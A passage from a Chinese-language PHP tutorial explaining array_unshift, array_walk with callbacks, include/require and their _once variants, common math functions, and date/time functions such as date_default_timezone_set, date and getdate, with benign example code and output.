<p><strong>功能：</strong> 操作一个数组，向数组中之前插入其他类型的参数。<br><strong>返回值：</strong> <font color="#FF7F00"><strong>int 类型</strong></font>，可能就是插入成功最后的个数<br><strong>参数：</strong> <font color="#FF7F00"><br><strong>第一个参数为&amp;符</strong></font>，也就是在操作的过程中，改变了第一个参数的值。引用传参。也就是操作这个数组，向这个数组中传入参数。会直接改变这个数组的值。<font color="#FF7F00"><br><strong>第二个参数为mixed</strong></font>，因为数组可以存入多个不同的类型.mixed是指混合的意思。因此，mixed是指可传入任意类型<font color="#FF7F00"><br><strong>第三个数数加了中括号[ ]</strong></font>，我们所有遇到中括号的。都是指后面的参数可传，也可以不传。<br>第四，最后还看到了三个…(省略号)。代表可以传入任意多个参数。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$queue</span> = array(<span class="string">&quot;凤姐&quot;</span>, <span class="string">&quot;芙蓉&quot;</span>);</span><br><span class="line">array_unshift(<span class="variable">$queue</span>, <span class="string">&quot;杨幂&quot;</span>, <span class="string">&quot;姚晨&quot;</span>);</span><br><span class="line">print_r(<span class="variable">$queue</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Array ( [0] =&gt; 杨幂 [1] =&gt; 姚晨 [2] =&gt; 凤姐 [3] =&gt; 芙蓉 )</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. 遇到callback的传函数或者匿名函数进去协助处理，让功能更强大。</strong></font><br></font><br>bool array_walk ( array &amp;$array , <font color="red"><strong>callable</strong></font> $callback [, mixed $userdata &#x3D; NULL ] )</p>
<p><font face="Comic sans MS"></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>功能：</strong></font><br>传入一个回调函数，将数组的原来的组操作，并且发生变化。<font color="#FF7F00"><br><strong>返回值：</strong></font><br>bool 值 也就是意味着，提示成功或者失败<font color="#FF7F00"><br><strong>参数：</strong></font><br>第一个参数是要操作的数组。<br>第二个参数是callback 代表着可以传入函数或者匿名函数。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$shuaige</span> = array(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;wuyanzhu&quot;</span>, <span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;huangxiaoming&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;ninzetao&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> test_print(<span class="variable">$item2</span>, <span class="variable">$key</span>)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$key</span> .<span class="string">&quot; ---&quot;</span>. strtoupper(<span class="variable">$item2</span>) . <span class="string">&quot;&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$shuaige</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">array_walk(<span class="variable">$shuaige</span>, <span class="string">&#x27;test_print&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;用自定义函数test_print执行后的效果：&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$shuaige</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  string(8) <span class="string">&quot;wuyanzhu&quot;</span></span><br><span class="line">  [<span class="string">&quot;b&quot;</span>]=&gt;</span><br><span class="line">  string(13) <span class="string">&quot;huangxiaoming&quot;</span></span><br><span class="line">  [<span class="string">&quot;c&quot;</span>]=&gt;</span><br><span class="line">  string(8) <span class="string">&quot;ninzetao&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">a ---WUYANZHU</span><br><span class="line">b ---HUANGXIAOMING</span><br><span class="line">c ---NINZETAO</span><br><span class="line">用自定义函数test_print执行后的效果：</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  string(8) <span class="string">&quot;wuyanzhu&quot;</span></span><br><span class="line">  [<span class="string">&quot;b&quot;</span>]=&gt;</span><br><span class="line">  string(13) <span class="string">&quot;huangxiaoming&quot;</span></span><br><span class="line">  [<span class="string">&quot;c&quot;</span>]=&gt;</span><br><span class="line">  string(8) <span class="string">&quot;ninzetao&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过上例，我们发现数组中的每个参数和值都被修改了。上例大家只需要理解看见传callback的，需要传入函数协助处理就可以。不用理解。我们在下一章的数组部份，学习完数组，大家可以再看看。<br>函数支持的版本号很重要。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-2-文件包含函数"><a href="#2-2-文件包含函数" class="headerlink" title="2.2 文件包含函数"></a><font color="#3CB371" face="Comic sans MS">2.2 文件包含函数</font></h4><p><font face="Comic sans MS">在实际开发中，常常需要把程序中的公用代码放到一个文件中，使用这些代码的文件只需要包含这个文件即可。这种方法有助于提高代码的重用性，给代码的编写与维护带来很大的便利。在PHP中， 有<br><font color="#00B2EE"><strong>include</strong></font><br><font color="#00B2EE"><strong>include_once</strong></font><br><font color="#00B2EE"><strong>require</strong></font><br><font color="#00B2EE"><strong>require_once</strong></font><br>四种方法包含一个文件。<br></font></p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">包含失败</th>
<th align="left">特点</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Inlcude</td>
<td align="center">返回一条警告</td>
<td align="left">文件继续向下执行。通常用于动态包含</td>
</tr>
<tr>
<td align="center">Require</td>
<td align="center">一个致命的错</td>
<td align="left">代码就不会继续向下执行。通常包含极为重要的文件，整个代码甭想执行</td>
</tr>
<tr>
<td align="center">Include_once</td>
<td align="center">返回一条警告</td>
<td align="left">除了原有include的功能以外，它还会做once检测，如果文件曾经已经被被包含过，不再包含</td>
</tr>
<tr>
<td align="center">Require_once</td>
<td align="center">一个致命的错</td>
<td align="left">除了原的功能一外，会做一次once</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**注意：**</font>
1，少用_once带once，因为它会消耗更多的资源去做检测的工作。
2，特高级
Include文件只需要编译一次，因为每次包含include都会再执行一次对应的代码，如何减少include再次执行
时，需要重新解析的过程。
</font></td></tr></table>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. include包含函数的功能。</strong></font><br></font><br>创建一个functions.php文件，里面写上两个函数：<font color="#FF6347">(1)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//functions.php文件</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">demo</span></span>()&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;cccdddd&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>在functions.php的同级目录下，我再创建一个user.php文件把functions.php文件包含进来。这样我的函数就可以专门放在functions.php里面，哪儿需要用到这些函数的时候，我就从哪儿包含进来：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//user.php</span><br><span class="line"></span><br><span class="line">include <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//可以直接调用</span><br><span class="line">demo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><strong>接下来我们对比include和require：</strong><font color="#FF6347">(2)↓↓</font><br>代码中，我们先用include来<strong>包含不存在</strong>的test.php文件，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//user.php</span><br><span class="line"></span><br><span class="line">include <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line">include <span class="string">&#x27;test.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//可以直接调用</span><br><span class="line">demo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>再用require包含 不存在的test.php文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//user.php</span><br><span class="line"></span><br><span class="line">include <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line">require <span class="string">&#x27;test.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//可以直接调用</span><br><span class="line">demo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><font color="#FF6347"><strong>通过上例的对比我们发现：</strong></font><br>(1) 如果test.php文件不存在include 会发出警告继续执行demo()和test()函数。<br>(2) 而requre则直接报错，demo()和test()函数无法继续执行。</p>
</blockquote>
<p>&amp;emsp;<br>我们通过表格知道了:<strong>inlcude</strong> 和<strong>include_once</strong>的区别在于，<font color="#00B2EE"><strong>检测是否重复包含。</strong></font><font color="red"><strong>如果重复包含了include_once不会再包含 对应的文件了，而include 则不管这些。有没引入过文件，都再引入一次。</strong></font>include使用两次会报错，而include_once不会报错！</p>
<p>同样刚刚的user.php我们再实验一下,我们将functions.php包含两次，分别使用<strong>include</strong>和<strong>include_once</strong>：<font color="#FF6347">(3)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//user.php</span><br><span class="line"></span><br><span class="line">//这儿被包含了两次同样的函数定义文件哟</span><br><span class="line">include <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line">include <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//可以直接调用</span><br><span class="line">demo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行后系统会报错！！！</span><br></pre></td></tr></table></figure>

<p>改为<strong>include_once</strong>再试一次：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//user.php</span><br><span class="line"></span><br><span class="line">//这儿被包含了两次同样的函数定义文件哟</span><br><span class="line">include_once <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line">include_once <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//可以直接调用</span><br><span class="line">demo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行后系统不会报错！！！</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>结论：</strong><br>我们在函数定义章节讲过，函数不能定义两次，否则会报错。<font color="#FF7F00"><strong>使用include时</strong></font>，因为我们将 functions.php包含了两次所以执行了两次，<font color="#FF7F00"><strong>因此报这个错误</strong></font>。<br>而<font color="#FF7F00"><strong>include_once不报错</strong></font>的原因是因为：他检测了functions.php曾经包含过，不再进行包含引入了。</p>
</blockquote>
<p><font face="Comic sans MS">而<strong>require</strong>和<strong>require_once</strong>的功能，大家用你最最聪明的小脑袋是不是就能推理出来了呢？require_once有两个特点：</p>
<ol>
<li>包含的文件必须存在，否则停止执行</li>
<li>会做重复包含检查哟</font></li>
</ol>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-3-数学常用函数"><a href="#2-3-数学常用函数" class="headerlink" title="2.3  数学常用函数"></a><font color="#3CB371" face="Comic sans MS">2.3  数学常用函数</font></h4><p>在PHP程序中常常需要进行数据处理运算，这就需要使用数学函数。<font color="#00B2EE"><strong>数学函数是最简单、最常用的系统函数</strong></font>。本章以数学函数为例讲解系统函数的调用方法。</p>
<p>只需要记最常用的一些即可，最常用的列表：</p>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="center">描述</th>
<th align="left">实例</th>
<th align="left">输入</th>
<th align="left">输出</th>
</tr>
</thead>
<tbody><tr>
<td align="center">abs()</td>
<td align="center">求绝对值</td>
<td align="left">$abs &#x3D; abs(-4.2); &#x2F;&#x2F;4.2</td>
<td align="left">数字</td>
<td align="left">绝对值数字</td>
</tr>
<tr>
<td align="center">ceil()</td>
<td align="center">进一法取整</td>
<td align="left">echo ceil(9.999); &#x2F;&#x2F; 10</td>
<td align="left">浮点数</td>
<td align="left">进一取整</td>
</tr>
<tr>
<td align="center">floor()</td>
<td align="center">舍去法取整</td>
<td align="left">echo floor(9.999); &#x2F;&#x2F; 9</td>
<td align="left">浮点数</td>
<td align="left">直接舍去小数部分</td>
</tr>
<tr>
<td align="center">fmod()</td>
<td align="center">浮点数取余</td>
<td align="left">“$x &#x3D; 5.7;$y &#x3D; 1.3;<br>$r &#x3D; fmod($x, $y);<br>&#x2F;&#x2F; $r equals 0.5, <br>because 4 *  1.3 + 0.5 &#x3D; 5.7”</td>
<td align="left">两个浮点数,x&gt;y</td>
<td align="left">浮点余数</td>
</tr>
<tr>
<td align="center">pow()</td>
<td align="center">返回数的n次方</td>
<td align="left">echo pow(-1, 20); &#x2F;&#x2F; 1</td>
<td align="left">基础数n次方</td>
<td align="left">乘方值</td>
</tr>
<tr>
<td align="center">round()</td>
<td align="center">浮点数四舍五入</td>
<td align="left">echo round(1.95583, 2);&#x2F;&#x2F; 1.96</td>
<td align="left">一个数值</td>
<td align="left">保留小数点后多少位,默认为0,舍入后的结果</td>
</tr>
<tr>
<td align="center">sqrt()</td>
<td align="center">求平方根</td>
<td align="left">echo sqrt(9); &#x2F;&#x2F;3</td>
<td align="left">被开方的数</td>
<td align="left">平方根</td>
</tr>
<tr>
<td align="center">max()</td>
<td align="center">求最大值</td>
<td align="left">“echo max(1, 3, 5, 6, 7);  <br>&#x2F;&#x2F; 7 echo max(array(2, 4, 5)); <br>&#x2F;&#x2F; 5”</td>
<td align="left">多个数字或数组</td>
<td align="left">返回其中的最大值</td>
</tr>
<tr>
<td align="center">min()</td>
<td align="center">求最小值</td>
<td align="left">min</td>
<td align="left">多个数字或数组</td>
<td align="left">返回其中的最小值</td>
</tr>
<tr>
<td align="center">mt_rand()</td>
<td align="center">更好的随机数</td>
<td align="left">echo mt_rand(0,9);&#x2F;&#x2F;n</td>
<td align="left">最小&#x2F;最大,随机数</td>
<td align="left">随机返回范围内的值</td>
</tr>
<tr>
<td align="center">rand()</td>
<td align="center">随机数</td>
<td align="left">echo rand()</td>
<td align="left">最小&#x2F;最大,随机数</td>
<td align="left">随机返回范围内的值</td>
</tr>
<tr>
<td align="center">pi()</td>
<td align="center">获取圆周率值</td>
<td align="left">echo pi(); <br>&#x2F;&#x2F; 3.1415926535898</td>
<td align="left">无</td>
<td align="left">获取圆周率</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-4-获取时期时间信息函数"><a href="#2-4-获取时期时间信息函数" class="headerlink" title="2.4  获取时期时间信息函数"></a><font color="#3CB371" face="Comic sans MS">2.4  获取时期时间信息函数</font></h4><p><font face="Comic sans MS">在正式学习日期函数前大家得了解几个概念：<br><font color="#00B2EE"><strong>1. 时区</strong><br><strong>2. 世界时</strong><br><strong>3 .unix时间戳</strong></font><br></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>时区</strong></font><br>这个概念，之前大家听说过很多。我们来啰嗦两句，我们现实生活中使用的实区，在电脑里面也是一样有规定的。<br>1884年在华盛顿召开国际经度会议时，为了克服时间上的混乱，规定将全球划分为24个时区。<br>在中国采用首都北京所在地东八区的时间为全国统一使用时间。</p>
</blockquote>
<blockquote>
<p><font color="#FF7F00"><strong>世界时</strong></font><br>不光是天文学家使用格林尼治时间（英文简写:GMT），就是在新闻报刊上也经常出现这个名词。我们知道各地都有各地的地方时间。如果对国际上某一重大事情，用地方时间来记录，就会感到复杂不便．而且将来日子一长容易搞错。因此，天文学家就提出一个大家都能接受且又方便的记录方法，那就是以格林尼治（英国某地区）的地方时间为标准。</p>
</blockquote>
<blockquote>
<p><font color="#FF7F00"><strong>unix时间戳</strong></font><br>电脑本身不认识时间，我们在电脑里面设置一个时间方便运算。于是我们规定了一种计算方式，unix时间戳。<br>从Unix纪元（1970 年 1月1日零时）开始到一个时间经过的秒数。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>1. 设置时区</strong></font><br>如果，我们是跨国的多语方程序，我们通常是通过在配置文件里面来写好了个时区，每次程序运行的时候。都会读取这个时区的设置，来显示时间。</p>
<p>设置时区的函数为：<br>1). <font color="red" ><strong>date_default_timezone_get()</strong></font><br>2). <font color="red" ><strong>date_default_timezone_set()</strong></font><br></font></p>
<p>&amp;emsp;<br><font color="#FF6347">(1)↓↓</font><br>第一个函数就不重点讲解了，比较简单。<br>用法如下：<br><font color="#00B2EE" ><strong>string date_default_timezone_get ( void )</strong></font><br>功能如下：<strong>取得一个脚本中所有日期时间函数所使用的默认时区</strong><br>示例：<br><font color="#00B2EE"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> date_default_timezone_get ();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出:UTC</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="#FF6347">(2)↓↓</font><br>第二个函数是重点：<br>用法如下：<br><font color="#00B2EE" ><strong>bool date_default_timezone_set ( string $timezone_identifier )</strong></font><br>功能如下：<strong>用于所有日期时间函数的默认时区</strong><font color="#00B2EE" >&amp;emsp;[注：<a href="http://php.net/manual/zh/timezones.php">时区列表请详见官方手册</a>]</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//定义一下时区常量，以后你可以放到配置文件里</span><br><span class="line">define(<span class="string">&#x27;TIME_ZONE&#x27;</span>,<span class="string">&#x27;Asia/shanghai&#x27;</span>);</span><br><span class="line"></span><br><span class="line">//执行函数</span><br><span class="line">date_default_timezone_set(TIME_ZONE);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出：2019-02-17 13:03:42</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>2. time()获取当前的unix时间戳</strong></font><br>以下代码输出当前时间的Unix时间戳。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   <span class="variable">$time</span>=time();</span><br><span class="line">   print_r( <span class="variable">$time</span>);</span><br><span class="line">?&gt;</span><br><span class="line">程序运行结果：</span><br><span class="line">1421597858</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>3. “亚麻跌”是PHP学习时间处理的关键</strong></font><br><font color="red" ><strong>Y</strong></font> &amp;emsp;英文是 year， 为年份   代表年 ——亚<br><font color="red" ><strong>m</strong></font> &amp;emsp;英文代表month，为月份  代表月 ——麻<br><font color="red" ><strong>d</strong></font> &amp;emsp;英文代表day， 为日期   代表日 ——跌<br><font color="red" ><strong>H:i:s</strong></font> &amp;emsp;代表的是：时分秒<br><font color="red" ><strong>h</strong></font> &amp;emsp;的英文为：hour 代表小时<br><font color="red" ><strong>i</strong></font>&amp;emsp; 的英文为：minute 代表分钟<br><font color="red" ><strong>s</strong></font>&amp;emsp; 的英文为：second 代表秒<br></font></p>
<p>所以我们需要输出前前的年份，月份，日期的话。例如：1997年7月1日，我们就可以用到上面的三个参数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> date(<span class="string">&#x27;Y年m月d日&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">2019年02月17日</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>写全了就是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//就可以显示出来当前的时间了哟。</span><br><span class="line"><span class="built_in">echo</span> date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red" ><strong>date函数</strong></font>用于将一个时间进行格式化输出，以方便时间的显示或存储。其语法格式如下：<br><font color="#00B2EE" ><strong>string date ( string $forrnat [, int $timestamp] )</strong></font><br>在参数列表中:<br>$timestamp是一个时间戳，函数将这个时间戳按$format规定的格式输出。<br>如果$timestamp没有输入值，则默认为当前的时间。<br>$format是一个时间输出格式的字符串，需要使用规定的字符构造输出格式。<br></font></p>
<p>&amp;emsp;<br><font color="#FF7F00"><strong>date函数的格式参数表：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">字符</th>
<th align="left">说明</th>
<th align="left">返回值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">d</td>
<td align="left">月份中的第几天，有前导零的2位数字</td>
<td align="left">01到31</td>
</tr>
<tr>
<td align="center">D</td>
<td align="left">英文星期几，3个字母</td>
<td align="left">Mon到Sun</td>
</tr>
<tr>
<td align="center">j</td>
<td align="left">月份中的第几天，没有前导零</td>
<td align="left">1到31</td>
</tr>
<tr>
<td align="center">l(字母)</td>
<td align="left">英文星期几</td>
<td align="left">Sunday到 Saturday</td>
</tr>
<tr>
<td align="center">N</td>
<td align="left">1格式数字表示的星期</td>
<td align="left">1（表示星期一）到7（表示星期天)</td>
</tr>
<tr>
<td align="center">S</td>
<td align="left">每月天数后面的英文后缀，2个字符</td>
<td align="left">st，nd，rd或者th。可以和jg一起用</td>
</tr>
<tr>
<td align="center">w</td>
<td align="left">星期中的第几天，数字表示</td>
<td align="left">0（表示星期天）到 6（表示星期六）</td>
</tr>
<tr>
<td align="center">z</td>
<td align="left">一年中的第几天</td>
<td align="left">0到366</td>
</tr>
<tr>
<td align="center">W</td>
<td align="left">年份中的第几周，每周从星期一开始</td>
<td align="left">42（当年的第42周）</td>
</tr>
<tr>
<td align="center">F</td>
<td align="left">月份，完整的文本格式</td>
<td align="left">January 到 December</td>
</tr>
<tr>
<td align="center">m</td>
<td align="left">数字表示月份，有前导零</td>
<td align="left">01 到 12</td>
</tr>
<tr>
<td align="center">M</td>
<td align="left">3个字母缩写表示的月份</td>
<td align="left">Jan 到Dec</td>
</tr>
<tr>
<td align="center">n</td>
<td align="left">数字表示月份，没有前导零</td>
<td align="left">1 到 12</td>
</tr>
<tr>
<td align="center">t</td>
<td align="left">给定月份所应有的天数</td>
<td align="left">28 到 31</td>
</tr>
<tr>
<td align="center">L</td>
<td align="left">是否为闰年</td>
<td align="left">如果是闰年为1，否则为o</td>
</tr>
<tr>
<td align="center">o</td>
<td align="left">格式年份数字</td>
<td align="left">例如2007</td>
</tr>
<tr>
<td align="center">Y</td>
<td align="left">4 位数字完整表示年份</td>
<td align="left">例如1999或2008</td>
</tr>
<tr>
<td align="center">y</td>
<td align="left">2 位数字表示的年份</td>
<td align="left">例如99或08</td>
</tr>
<tr>
<td align="center">a</td>
<td align="left">小写的上午和下午值</td>
<td align="left">am或pm</td>
</tr>
<tr>
<td align="center">A</td>
<td align="left">大写的上午和下午值</td>
<td align="left">AM或PM</td>
</tr>
<tr>
<td align="center">g</td>
<td align="left">小时，12小时格式，没有前导零</td>
<td align="left">1到12</td>
</tr>
<tr>
<td align="center">G</td>
<td align="left">小时，24小时格式，没有前导零</td>
<td align="left">0 到 23</td>
</tr>
<tr>
<td align="center">i</td>
<td align="left">有前导零的分钟数</td>
<td align="left">00 到 59</td>
</tr>
<tr>
<td align="center">s</td>
<td align="left">秒数，有前导零</td>
<td align="left">00到59</td>
</tr>
<tr>
<td align="center">e</td>
<td align="left">时区标识</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">U</td>
<td align="left">从Unix纪元开始至今的秒数</td>
<td align="left">长整型数字</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>4. getdate获取当前系统时间</strong></font><br><font color="red" ><strong>getdate</strong></font>用来获取当前系统的时间，或者获得一个时间戳的具体含义。时间戳是一个长整数，表示getdate的语法格式如下所示。<br><font color="red" ><strong>array getdate ([ int $timestamp &#x3D; time() ] )</strong></font><br>函数的返回值是一个根据timestamp得到的包含有时间信息的<strong>数组</strong>。如果没有参数，则会返回当前的时间。getdate返回的数组，键名包括时间和日期的完整信息。<br></font></p>
<table>
<thead>
<tr>
<th align="center">键名</th>
<th align="left">说明</th>
<th align="left">返回值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">secnods</td>
<td align="left">秒</td>
<td align="left">数字0到 59</td>
</tr>
<tr>
<td align="center">minutes</td>
<td align="left">分钟</td>
<td align="left">数字0到59</td>
</tr>
<tr>
<td align="center">hours</td>
<td align="left">小时</td>
<td align="left">数字 0到 23</td>
</tr>
<tr>
<td align="center">mday</td>
<td align="left">月份中第几天    数字</td>
<td align="left">1到 31</td>
</tr>
<tr>
<td align="center">wday</td>
<td align="left">星期中第几天    数字</td>
<td align="left">0（表示星期天）到6（表示星期六）</td>
</tr>
<tr>
<td align="center">mon</td>
<td align="left">月份</td>
<td align="left">数字 1 到 12</td>
</tr>
<tr>
<td align="center">year</td>
<td align="left">年</td>
<td align="left">4 位数字表示的完整年份</td>
</tr>
<tr>
<td align="center">yday</td>
<td align="left">一年中第几天    数字</td>
<td align="left">0到365</td>
</tr>
<tr>
<td align="center">weekday</td>
<td align="left">星期几的英文</td>
<td align="left">Sunday到 Saturday</td>
</tr>
<tr>
<td align="center">month</td>
<td align="left">月份的英文</td>
<td align="left">January 到 December</td>
</tr>
<tr>
<td align="center">0</td>
<td align="left">自从Unix纪元开始的秒数</td>
<td align="left">长整型数字</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>以下代码可以返回getdate 数组的详细信息。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$mytime</span>=getdate(); </span><br><span class="line">   print_r( <span class="variable">$mytime</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><strong>print_r</strong>可以输出一个数组中所有的键名与值。运行这段代码，结果如下所示。程序输出当前计算机的时间与日期详细信息：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [seconds] =&gt; <span class="number">1</span>            <span class="comment">//秒</span></span><br><span class="line">    [minutes] =&gt; <span class="number">10</span>            <span class="comment">//分钟</span></span><br><span class="line">    [hours] =&gt; <span class="number">17</span>            <span class="comment">//小时</span></span><br><span class="line">    [mday] =&gt; <span class="number">18</span>            <span class="comment">//日</span></span><br><span class="line">    [wday] =&gt; <span class="number">0</span>            <span class="comment">//星期中的第几天</span></span><br><span class="line">    [mon] =&gt; <span class="number">1</span>            <span class="comment">//月</span></span><br><span class="line">    [year] =&gt; <span class="number">2015</span>            <span class="comment">//年</span></span><br><span class="line">    [yday] =&gt; <span class="number">17</span>            <span class="comment">//年中的第几天</span></span><br><span class="line">    [weekday] =&gt; Sunday        <span class="comment">//星期</span></span><br><span class="line">    [month] =&gt; January        <span class="comment">//月份</span></span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1421597401</span>        <span class="comment">//时间戳</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="#FF6347">↓↓</font>理解了getdate函数和返回的数组以后，就很容易取得当前的时间信息了。下面的代码就是用getdate函数取得时间信息，调用返回时间数组的值输出时间信息。<br><font color="#00B2EE" ></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$mytime</span> = getdate();</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;年 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;year&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;月 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;mon&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;日 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;mday&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span 